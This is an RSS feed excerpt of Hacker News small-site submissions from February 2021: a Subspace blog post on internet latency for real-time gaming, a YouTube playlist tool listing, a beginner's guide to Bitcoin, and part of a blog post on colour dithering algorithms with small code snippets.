        <item>
            <title>
<![CDATA[Why the Internet Today Isn‚Äôt Built for the Billions of Gamers of Tomorrow]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 7 (<a href="https://news.ycombinator.com/item?id=26124917">thread link</a>) | @quentusrex
<br/>
February 13, 2021 | https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow | <a href="https://web.archive.org/web/*/https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-4b4cde9dbdbb9767ad24"><div><p>The 2020 pandemic exposed a fundamental flaw in the way the Internet is built.</p><p>Online games were blamed for clogged networks and slowed speeds, but in reality, the Internet is structurally broken when it comes to real-time interactivity. You‚Äôve heard the line:</p><p><strong><em>Kids, get off your consoles; I‚Äôm on a video call!</em></strong></p><p>It‚Äôs 4 PM on Wednesday. You‚Äôre on an important Zoom call and right in the middle of presenting when your face freezes. Those on the call can only catch half of what you say and are left staring at an unflattering image of you mid-word.</p><h3><strong>How We Got Here: The Evolving Internet</strong></h3><p>The Internet is built for the reliable delivery of content, such as e-mail and file transfers, but not built for performance. Border Gateway Protocol (BGP)‚Äî the standardized routing protocol for the Internet‚Äîhas no idea what traffic it is routing or in which direction it is sending data. It simply routes data using the cheapest path possible depending on various factors, including politics, commercial agreements, and cost. As a result, certain types of data, namely real-time communications, suffer as the Internet favors servicing volumetric traffic.</p><p>At the start of the millennium, content delivery networks employed global networks of servers to deliver static content faster, leading the way to make OTT (Over-the-top, services offered over the top of traditional content distributors) possible with the infrastructure built by companies such as Netflix, YouTube, and Akamai. More recently, companies like Amazon Web Services have democratized cloud computing, bringing connectivity to more users in more regions of the world. The next evolution of the Internet should be one in which the network itself is democratized, enabling speed-of-light communication for the applications that require high-velocity delivery, such as real-time communications. This means delivering voice over internet protocol calls (VoIP, e.g., Skype, Clubhouse), online multiplayer video games, and more, regardless of the compute or data server owner.</p><h3><strong>Complex Issues with a Complex Network</strong></h3><p>The Internet is a complicated web of networks and billions of computers and devices that connect to each other and work together to send and receive information. The greater the distance between the sending and receiving computers, the longer it takes the data to arrive at its destination. Information can also take different paths, which may increase or decrease the speed of delivery.</p><p>A common analogy used to explain the way the Internet works is the postal service. In the same way that your letter travels from you to the recipient through multiple facilities (carrier, sorting, post office), data travels through numerous routers on its way to the recipient computer. Just as your letter can arrive faster depending on which mail service you use, so too can data transmit faster depending on which path it takes, though the distance between the sender and receiver has the most influence on travel time.</p><p>There are a couple of significant differences in this analogy, however.</p><p><em>One, there are generally more ‚Äústops‚Äù along the way for data, and two, the data is broken up into multiple smaller ‚Äúpackets‚Äù of information rather than sent as one whole mail piece.</em></p><p>Because there are different paths along which individual packets of information can travel, each entailing a variable number of stops along the way, packets of data can easily get lost.</p><p><strong>Packet loss</strong>, as it‚Äôs called, results in missing information and a degraded user experience. In a Skype call, packet loss is experienced as gaps in audio. In video games, packet loss results in strange behavior like teleportation, in which a game freezes, then suddenly moves a player‚Äôs character to another place when the game resumes.</p><p>Another result of these inconsistent, differing routes is variation in delivery time. Some routes are faster than others, so some packets may arrive more quickly than others since the Internet is not conscious of which path it takes in sending data from one point to another. This variation in the time it takes for data to travel across the network from one endpoint to another is called <strong>latency</strong>, and the result of latency is <strong>jitter</strong>. On a Skype call, jitter manifests as jumbled speech that creates an indecipherable conversation. In video games, jitter manifests in behavior like errant shots, in which a player‚Äôs aim may be correct, but the shot doesn‚Äôt register in time to hit the target where they are.</p><p>While <strong>lag</strong> (high levels of latency), jitter, and packet loss may impact any online service or application, certain applications depend upon real-time packet delivery and minimal jitter and packet loss to function correctly and maintain a reasonable quality of experience. Packet delivery, consistent latency, and minimal lag are critical for services and applications like VoIP and online gaming and in numerous other industries such as high-frequency trading, telemedicine, and the Internet of Things.</p><p>For these applications, milliseconds saved in delivering data can lead to a real or virtual life-and-death situation and mean the difference between winning and losing millions of dollars or between a quality and a subpar gaming experience.</p><h3><strong>How Subspace Improves Real-Time Application Delivery</strong></h3><p>A millisecond‚Äôs delay in delivery does not matter in sending an email or a text message, but it does matter in real-time communications. So why should these applications travel on the same network, in the same way?</p><p>Subspace‚Äôs vision is to create an Internet byway through which latency-critical web traffic such as video games, VoIP, and video conferencing can consistently pass through at the speed of light. Like Waze for the Internet, Subspace gives the Internet a GPS of sorts, finding the absolute fastest and most secure and consistent path for real-time data to travel from endpoint to endpoint. As a result, latency and lag are reduced, and real-time applications reach their full potential.</p><p>While other companies have attempted to provide solutions for expediting real-time communications on the Internet, none have addressed the issue across the entire system. Many introduce other issues in their attempts. Commercial networking solutions like Cisco and Juniper were not built for global coordination or to understand and control game traffic. Standalone solutions that require SDKs installed in clients and servers can create significant security and stability risks. And services provided by CDNs like Cloudflare and Akamai utilize the same principles and infrastructure as their primary businesses‚Äîthat is, volumetric traffic‚Äîmaking the possibility of optimizing real-time traffic at scale a costly and difficult endeavor.&nbsp;</p><p>In the case of video games, lag, packet loss, and jitter are such a concern that some game companies have endeavored to build their own custom solutions. This ‚Äúdo it yourself‚Äù approach requires massive internal coordination, investment, and attention, which many publishers cannot afford to prioritize. And still, a DIY approach limits the publisher to its existing commercial relationships and capabilities.</p><p>Subspace‚Äôs platform optimizes every component of network performance, from the infrastructure stack to the networking stack, including software and hardware, the control plane, and the data plane. With a global Internet architected specifically for real-time traffic at every point, we are achieving speed-of-light communication and democratizing the network. Regardless of the data‚Äôs location, Subspace uses a vast system of Internet quality metrics and a proprietary algorithm to direct real-time interactive traffic onto our platform and across the public and our private Internet to and from servers. The algorithm can balance multiple variables to suit each application‚Äôs needs‚Äîvariables such as absolute latency, any latency above a threshold, jitter &amp; loss. The optimal delivery platform via the Subspace onramp drives better, more consistent experiences that match each application‚Äôs needs.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_35285"><div><p>We start with purpose-built points of presence (PoPs), deploying our hardware in data centers worldwide. Each PoP is capable of handling millions of servers, millions of simultaneous user sessions, and enough capacity for all of the user traffic while also providing room for absorbing DDOS attacks, with the expectation that traffic by its nature is mostly small UDP packets.</p><p>The PoPs are distributed globally and specifically network-engineered to reduce the distance needed for players to reach our onramp, minimizing the risk of congestion and misrouting. Players are given a Subspace IP and UDP port as a proxy for a server.</p><p>The Subspace PoP uses a proprietary algorithm to determine the optimal path through our private network before ultimately reaching the game server and back. We do this both ways, packets can take a different route back from the server if Subspace finds a better path for the application needs, another differentiator to CDNs, which are optimized for one-way traffic. Continuous telemetry measures the latency, jitter, and loss between Subspace PoPs, feeding into an algorithm that determines the optimum route between the edge and application servers. On the network‚Äôs server-side, we have PoPs directly connected with major providers to minimize latency and lag upon exiting our network.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1612978699676_41155"><div><p>Subspace‚Äôs global network, which has already launched in multiple regions and is being aggressively deployed towards a global optimized network, already supports some of the world‚Äôs most popular online games. And it‚Äôs not just about performance. The Subspace platform leverages all of these PoPs to provide a tremendous platform for stopping DDoS attacks against application servers at the edge, before bot networks can aggregate into attacks that get too big to handle or have to be sent off to latency-inducing scrubbing centers. Troublesome attack vectors, replay attacks, and other volumetric attacks can be easily stopped at the Subspace edge, while the game server infrastructure remains protected ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow">https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</a></em></p>]]>
            </description>
            <link>https://www.subspace.com/blog/why-the-internet-today-isnt-built-for-the-billions-of-people-who-will-be-gaming-tomorrow</link>
            <guid isPermaLink="false">hacker-news-small-sites-26124917</guid>
            <pubDate>Sat, 13 Feb 2021 17:22:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Create YouTube playlists without an account (savable as url)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26123256">thread link</a>) | @nevernothing
<br/>
February 13, 2021 | https://playlists.at/youtube/ | <a href="https://web.archive.org/web/*/https://playlists.at/youtube/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://playlists.at/youtube/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26123256</guid>
            <pubDate>Sat, 13 Feb 2021 12:34:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Beginner‚Äôs Guide to Getting Started with Bitcoin]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 83 (<a href="https://news.ycombinator.com/item?id=26122394">thread link</a>) | @onerom
<br/>
February 13, 2021 | https://serhack.me/articles/getting-started-with-bitcoin/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/getting-started-with-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img src="https://serhack.me/images/bitcoin-getting-started/social_oasis.jpg"><figcaption><h4>A man looks for Bitcoin Oasis</h4></figcaption></figure><p>If you have heard about blockchain or cryptocurrency, then the term that initially comes to mind is <a href="https://bitcoin.org/">Bitcoin</a>. Launched 12 years ago, it was the late 2017 bull run that created a media frenzy that propelled Bitcoin into the mainstream and our modern day lexicon.</p><p>Often labeled as the ‚Äúoriginal‚Äù cryptocurrency, <a href="https://bitcoin.org/">Bitcoin</a> has been the catalyst (directly and/or indirectly) behind many new innovations in the blockchain and digital asset space, most notably <a href="https://ethereum.org/">Ethereum</a> and <a href="https://getmonero.org/">Monero</a>. Shortly after the late 2017 bull run lost its steam, interest in these new technologies started to fade ‚Äï but here we are in 2021 with Bitcoin having risen like a phoenix from the ashes. As you would assume, an appetite for the blockchain and digital asset space has returned and now it is more important than ever that we understand what exactly is behind this unique asset, Bitcoin.</p><p>This article is meant to be a guide for individuals who are new to cryptocurrency and want to learn about <a href="https://bitcoin.org/">Bitcoin</a>, specifically its use case and the different ways to become involved in the broader blockchain and digital asset space. My goal is to educate you on the basics and make sure that you walk away with a newfound perspective and understanding of <a href="https://bitcoin.org/">Bitcoin</a>.</p><h2 id="what-is-bitcoin">What is Bitcoin?</h2><p>Bitcoin is a peer-to-peer version of electronic cash whose transactions are recorded in a public distributed ledger called a blockchain. In late October 2008, Satoshi Nakamoto (whose identity is still unknown) published a white paper titled <a href="https://bitcoin.org/bitcoin.pdf"><em>Bitcoin: A Peer-to-Peer Electronic Cash System</em></a> on bitcoin.org (registered in August 2008) and subsequently posted it to <a href="https://www.metzdowd.com/pipermail/cryptography/2008-October/014810.html">a cryptography mailing list</a>. On January 3, 2009, the Bitcoin network was created when Satoshi Nakamoto mined the initial block of the chain, which is called the genesis block.</p><p>In essence, Bitcoin is a decentralized type of ‚Äúdigital money‚Äù that can be used by anyone around the world, at any time, and without restrictions or a central authority. Bitcoin is not backed by any bank or government and originally allowed users to freely send and/or spend it anywhere without trusting third parties.</p><p>At inception, the price of Bitcoin was approximately $0.01 and, as of today, the price has surpassed $40,000 per coin ‚Äï with many believing that it can grow exponentially higher to levels between $100,000 and $250,000 in the next year or so.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_1_blockchain-80.jpg"><figcaption><h4>The transactions data are memorized through a chain-of-blocks</h4></figcaption></figure><p>Given that Bitcoin exists and operates within the confounds of the Internet, all user balances are kept on an immutable and fully transparent blockchain. Put simply, each Bitcoin transaction is broadcasted to the Bitcoin network and grouped with several other transactions in the form of a block, which the network‚Äôs miners validate. Once the block is accepted, the transactions get recorded on the blockchain (which, as you may recall, is a public ledger). Whenever this process is successfully completed, the network distributes new Bitcoin to miners for each block that has been validated ‚Äï this is referred to as a block reward.</p><p>The peculiarity of the blockchain is its distribution and decentralized properties, as all the nodes share a valid copy of the public ledger. In the Bitcoin network, nodes play a very important role ‚Äï think of them as ‚Äúprotectors‚Äù who are constantly monitoring Bitcoin‚Äôs blockchain to distinguish legitimate Bitcoin transactions from illegitimate ones. The basic job of a node is to prevent attempts to double-spend Bitcoins that have already been spent elsewhere. In addition, the process of mining is essential to validating transactions, as it ensures the overall trustworthiness and security of the payment network.</p><h2 id="advantages-and-limitations">Advantages and Limitations</h2><p>Members of the cryptocurrency community, who range from the tech savvy to your average retail investor, have adopted various perspectives regarding the fundamental driver of Bitcoin‚Äôs value (both in financial and non-financial terms).</p><p>On one side, there are the Bitcoin Maximalists who believe that Bitcoin is the ultimate financial innovation and will assume a mainstream role in global society ‚Äï to maximalists, other cryptocurrencies and traditional financial instruments are inferior. On the other side, you have cryptocurrency enthusiasts who believe Bitcoin‚Äôs technology is outdated and that other cryptocurrencies, such as Ethereum, have more expansive utility.</p><p>These arguments and differences of opinion (as it relates to Bitcoin) can often become confusing, so let‚Äôs dig deeper into some of the most common discussion points with hopes that you can decipher for yourself.</p><h3 id="advantages">Advantages</h3><ul><li>A blockchain is managed autonomously using <strong>a peer-to-peer network</strong> and cannot be shut down ‚Äï the only way to stop it is through shutting down or banning Internet access. (Note: Even though a blockchain or Bitcoin cannot be shut down, some jurisdictions have imposed restrictions on citizens that limit or ban the holding or trading of Bitcoin and/or other cryptocurrencies.)</li><li>There is no need to trust a third party. <strong>You are your own bank!</strong></li><li>Relatively quick and cheap transactions without intermediary fees (around 10 minutes on average per transaction), when compared to most leading cryptocurrencies.</li><li>Increasing adoption by merchants and individuals across the globe.</li><li>Largest market capitalization and name recognition, which will continue to promote its growth and (hopefully) price stability.</li></ul><h3 id="limitations">Limitations</h3><ul><li><strong>Lack of anonymity</strong> as transactions that take place in the Bitcoin network, along with many other leading cryptocurrencies, are fully transparent and can potentially be linked via chain analysis. In addition, strict AML/KYC regulations require many of the leading cryptocurrency trading exchanges to verify your most sensitive personal information.</li><li>Slow and expensive transactions, when compared to lesser known cryptocurrencies that can be sent within seconds and at a fraction of the cost.</li><li>Irreversible transactions. Once a transaction is sent, you cannot undo or cancel the transaction.</li><li>Achievement of its status as a currency will be challenging due to its volatile nature (i.e. swings in price) and regulations.</li><li>The core technology has some subtle limits that make Bitcoin outdated in comparison with other cryptocurrencies.</li></ul><p>Along with Bitcoin Maximalists and cryptocurrency enthusiasts, you have many individuals who simply like to be long-term holders of Bitcoin (because they believe in the fundamentals and value proposition) and others who speculate on the short-term price (e.g. day traders).</p><p>Whatever side you are on, there is no question that Bitcoin has established itself as a serious contender in the financial world and is here to stay for the time being. There may be other alternatives, but the granddaddy of cryptocurrencies still has the spotlight!</p><h2 id="how-to-obtain-bitcoin-from-an-exchange">How to Obtain Bitcoin from an Exchange</h2><p>Now that you have an understanding of Bitcoin and its utility, you may be interested in purchasing some. If that is the case, you have come to the right place as buying it is now easier than ever due to the growing number of exchanges and companies making Bitcoin accessible to the masses.</p><p>Some of the most well-known exchanges that allow you to purchase Bitcoin and other cryptocurrencies are <a href="https://coinbase.com/">Coinbase</a>, <a href="https://www.gemini.com/">Gemini</a>, <a href="https://www.kraken.com/">Kraken</a>, <a href="https://binance.com/">Binance</a>, and <a href="https://www.huobi.com/en-us/">Huobi</a>. While all of these exchanges list Bitcoin, not all of them offer the same cryptocurrencies ‚Äï so, it is recommended to open accounts across a few exchanges to ensure that you are provided adequate exposure.</p><p>Once you have created an account on an exchange, you can transfer your local fiat money via ACH or bank wire to the exchange. From there, you can purchase Bitcoin or another cryptocurrency in exchange for your local fiat money. In addition, after purchasing Bitcoin, you can exchange it for another cryptocurrency that you might not be able to purchase with your local fiat money. While some exchanges offer credit card purchases of Bitcoin, please keep in mind that the fees associated with this transaction are typically very high.</p><figure><img src="https://serhack.me/images/bitcoin-getting-started/extras_2_exchange-80.jpg"><figcaption><h4>You can exchange central currencies (EUR, USD) to BTC, but sacrificing privacy.</h4></figcaption></figure><p>Using any of the exchanges listed above is the easiest and most convenient way to purchase Bitcoin, as the majority of the other cryptocurrency exchanges do not support fiat currencies. This being the case, you can only exchange other cryptocurrencies (like Ethereum or Monero) for Bitcoin. <a href="https://cash.app/">Cash App</a> and <a href="https://www.paypal.com/us/webapps/mpp/crypto">PayPal</a>, some of the largest financial technology companies, offer its users the ability to purchase Bitcoin. While this is extremely convenient for users of these platforms, the downside for PayPal (not Cash App) is that your Bitcoin must remain on its platform, so you cannot transfer or send it. Remember: Not your keys, not your coins.</p><p>If you are not keen on using any of the methods described above, Bitcoin ATMs are a great alternative. There are over 14,000 physical ATMs worldwide, most of which can be found in major cities at peculiar locations such as a shopping mall, burger restaurant, or a bar. All you need to do is deposit cash and enter your Bitcoin address. Once you have completed the transaction, the funds will be sent to you. This is a very simple process and typically does not require any identity verification, but beware of high fees!</p><h2 id="who-accepts-bitcoin">Who Accepts Bitcoin?</h2><p>Over the years, many individuals and businesses have begun accepting Bitcoin as a form of payment. From time to time, you might have noticed stickers on a shop‚Äôs window that says ‚ÄúBitcoin accepted here.‚Äù As mentioned above, after the bull run of late 2017 died down, overall interest in cryptocurrencies (especially Bitcoin) amongst merchants began to wane. Today, Bitcoin and the broader digital asset space has bounced back from a pricing perspective and, with this, so has the interest amongst merchants who have triggered another wave of increased acceptance, most notably <a href="https://apnews.com/article/financial-markets-elon-musk-bitcoin-061817c6795e75d1c3c9e9d6cfc4a911">Tesla</a> disclosing that it has invested approximately $1.5 billion into Bitcoin and that the company plans to accept Bitcoin as payment for its electric vehicles.</p><p>There have been a few prominent ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/getting-started-with-bitcoin/">https://serhack.me/articles/getting-started-with-bitcoin/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/getting-started-with-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26122394</guid>
            <pubDate>Sat, 13 Feb 2021 09:02:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ditherpunk 2 ‚Äì beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 182 | Comments 57 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a rel="me" href="https://sunbeam.city/@makeworld"></a>
    <header>
        <h3><span>www.makeworld.gq</span></h3>
        <nav>
<a href="https://www.makeworld.gq/">Home</a>
<a href="https://www.makeworld.gq/about/">About</a>
<a href="https://www.makeworld.gq/blog/">Blog</a>

        </nav>
    </header>
    
    
    
    
    <p>Feb 12th, 2021<br>
by <strong>makeworld</strong></p>

<p><em>Last updated: Feb. 13, 2021</em></p>

<hr>

<p><em>This post contains some images that need to be viewed at 100% size to be seen correctly. If you normally browse
at a higher zoom level than 100%, please zoom out when you get to any of the images.</em></p>

<hr>

<p>Just yesterday, I released my <a href="https://github.com/makeworld-the-better-one/dither">dithering library</a>, written in Go.
It‚Äôs the product of many hours of research, experimentation, and refactoring. I‚Äôm
excited that it‚Äôs finally out, and to see what people create with it. Personally I‚Äôd like to create a CLI dithering
tool at some point that uses it.</p>

<p>Creating this library required research into the different algorithms for dithering, and how to implement them.
Unfortunately, not all of that knowledge is easily found. It‚Äôs spread across blog posts, Wikipedia pages without
citations, old books, and code comments. Recently, Surma wrote an article called
<a href="https://surma.dev/things/ditherpunk/">Ditherpunk ‚Äî The article I wish I had about monochrome image dithering</a>.
It is an invaluable resource that combines lots of knowledge about dithering into one place. The main thing missing
from the post, however, is going beyond ‚Äúmonochrome‚Äù. Surma shows us how to dither with a 1-bit palette of black and
white, but what about more shades of gray? What about colour images? With this blog post I‚Äôd like to explore those
techniques, taking them out of my code and into English, so you can easily apply them elsewhere.</p>

<p><strong>First off, please read Surma‚Äôs post.</strong> It explains what dithering is, how it works, and many different algorithms.
I don‚Äôt feel the need to explain these again, but merely add on what I‚Äôve learned.</p>

<h2 id="before-we-start">Before we start</h2>

<p>An HN commenter <a href="https://news.ycombinator.com/item?id=26122642">informed me</a> that you cannot accurately represent
linear RGB with just 8-bits (0-255), you need at least 12. Because of this, I have updated the blog post to use
16-bit color (0-65535), and will be updating the library shortly. Make sure you do this in your code too!</p>

<h2 id="overview">Overview</h2>

<p>Dithering operations consist of at least two steps, applied to each pixel. Sometimes there are further steps, like
‚Äúmodify these nearby pixels‚Äù, but these are the basic ones.</p>

<ol>
  <li>Modify the pixel‚Äôs colour value.</li>
  <li>Find the colour in the palette that is ‚Äúclosest‚Äù to that modified value and use that on the output image.</li>
</ol>

<p>Now, we know from Surma‚Äôs post that step 1 must be done with linear RGB values. Otherwise, different values will be
affected differently ‚Äì for example adding 5 to each colour won‚Äôt affect all colours the same way.</p>

<p>But what about step 2? How do we find the closest colour in the palette? In 1-bit dithering we don‚Äôt have to worry
about this, because anything above 0.5 is white, and anything below is black. But when your palette colours can be
anyhere in a 3D space, it is something that needs to be figured out.</p>

<p>Perhaps surprisingly, we‚Äôre not looking for a way that matches human perception. In fact, we are using Euclidean
distance with linear RGB values, which doesn‚Äôt match human perception at all! Why is this?
Thomas Mansencal (<a href="https://github.com/KelSolaar">@KelSolaar</a>) explains it best:</p>

<blockquote>
  <p>You can factor out the observer [the human] because what you are interested in here is basically energy
conservation. The idea being that for a given pool of radiant power emitters, if you remove a certain number of
them, by how much must the radiant power of the remaining ones be increased to be the same as that of the full
pool. It is really a ratio and doing those operations in a linear space is totally appropriate!</p>
</blockquote>

<p>This helped it click for me. Dithering can be thought of as trying to reconstruct the ‚Äúradiant power‚Äù of the original
pixel colours, while restricted to a certain set of ‚Äúemitters‚Äù, aka the palette colours. It is only with linearized
RGB values that we can properly measure the radiant power.</p>

<h2 id="random-noise-grayscale">Random Noise (grayscale)</h2>

<p>Random noise is a good one to start with, to show the differences between 1-bit dithering and larger palettes.</p>

<p>Surma does this by basically just adding a random number from -0.5 to 0.5, and then thresholding it.</p>

<div><div><pre><code><span>grayscaleImage</span><span>.</span><span>mapSelf</span><span>(</span><span>brightness</span> <span>=&gt;</span>
  <span>brightness</span> <span>+</span> <span>(</span><span>Math</span><span>.</span><span>random</span><span>()</span> <span>-</span> <span>0.5</span><span>)</span> <span>&gt;</span> <span>0.5</span> 
    <span>?</span> <span>1.0</span> 
    <span>:</span> <span>0.0</span>
<span>);</span>
</code></pre></div></div>

<p>In my library, there are two separate random noise functions. One is for grayscale, and one is for RGB. The grayscale
one looks like this:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>max</span><span>-</span><span>min</span><span>)</span><span>+</span><span>min</span><span>))</span>
</code></pre></div></div>

<p>The math with <code>min</code> and <code>max</code> is just to put the random value in the desired range. If we clean that up it‚Äôs more
understandable:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>rand</span><span>())</span>
</code></pre></div></div>

<p><code>rand()</code> just represents a function that does whatever range we want, -0.5 to 0.5 in this case.</p>

<p>So, obviously this is quite similar to what Surma does. The heavy lifing of the dithering in this case is done by the
other code, the part that finds the best palette colour.</p>

<p>The main thing that‚Äôs worth noting here is how the rounding works. <code>roundClamp</code> rounds the value to an integer, and then
clamps it to the range 0-65535. But how is the rounding done?</p>

<p>Another <a href="https://news.ycombinator.com/item?id=26122642">HN commenter</a> shared <a href="http://www.cplusplus.com/articles/1UCRko23/">this link</a>
which discusses different rounding methods, and the problems with the way rounding is often done. The best solution is to
use a rounding function that does this:</p>

<blockquote>
  <p>Given a number exactly halfway between two values, round to the even value (zero is considered even here).</p>

  <p>round( 1.7 ) ‚Äì&gt; 2 round( 2.7 ) ‚Äì&gt; 3<br>
round( 1.5 ) ‚Äì&gt; 2 round( 2.5 ) ‚Äì&gt; 2<br>
round( 1.3 ) ‚Äì&gt; 1 round( 2.3 ) ‚Äì&gt; 2</p>
</blockquote>

<p>This is not really about dithering, but this is a pretty important point to get things right mathematically.
Make sure you do it! Otherwise your outputs will be biased.</p>

<h2 id="random-noise-rgb">Random Noise (RGB)</h2>

<p>Back to random noise, but for colour this time.</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxR</span><span>-</span><span>minR</span><span>)</span><span>+</span><span>minR</span><span>))</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxG</span><span>-</span><span>minG</span><span>)</span><span>+</span><span>minG</span><span>))</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxB</span><span>-</span><span>minB</span><span>)</span><span>+</span><span>minB</span><span>))</span>
</code></pre></div></div>

<p>And simplified:</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randR</span><span>())</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randG</span><span>())</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randB</span><span>())</span>
</code></pre></div></div>

<p>Pretty simple, it just adds randomness in each channel. This can be done with grayscale images too, but it won‚Äôt
work very well, because grayscale colours only actually have one dimension. So it will just not add as much
randomness as you would expect.</p>

<p>Also note that usually you‚Äôll want the random ranges to be the same for R, G, and B.</p>

<p>Here‚Äôs an example:</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/random_noise_rgb_red-green-black.png">
<figcaption>
Random Noise (palette is red, green, black)
</figcaption>
</figure>

</section>

<h2 id="ordered-dithering">Ordered Dithering</h2>

<h3 id="modifying-threshold-matrices">Modifying threshold matrices</h3>

<p>Most of the resources online that talk about ordered dithering talk about a ‚Äúthreshold matrix‚Äù. ‚ÄúThresholding‚Äù is
how these matrices are applied for 1-bit dithering. You divide the matrix by whatever number is specified, scale
it to the colour value range, and compare it to each pixel in the image. If it‚Äôs less than the matrix value, make
it black, otherwise white. Obviously this doesn‚Äôt work with any other kind of palette. So what‚Äôs the solution?</p>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Wikipedia</a> offers an answer. Unfortunately there‚Äôs no citation,
but I‚Äôve confirmed independently that it works. Here it is with some of my own math added as well.</p>

<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>65535</mn><mo>√ó</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo><mo>√ó</mo><mrow><mo fence="true">(</mo><mfrac><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>+</mo><mn>1</mn></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></mfrac><mo>‚àí</mo><mn>0.5</mn><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">(65535 \times strength) \times \left( \frac{cell + 1}{max} - 0.5 \right)</annotation></semantics></math></span></span></span>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">cell</annotation></semantics></math></span></span> is a single cell of the matrix.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> is a percentage, usually a float from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>. It‚Äôs the amount the matrix will be applied to the
image. The closer to zero it is, the smaller the range of input colors that will be dithered. Colors outside
that range will be quantized. Usually you‚Äôll want a strength of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>, to apply the matrix and dither fully, but
sometimes reducing it can be useful, to reduce noise in the output image. It is inversely proportional to contrast ‚Äì
that is, when you reduce the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span>, it is visually similar to increasing the contrast.</p>

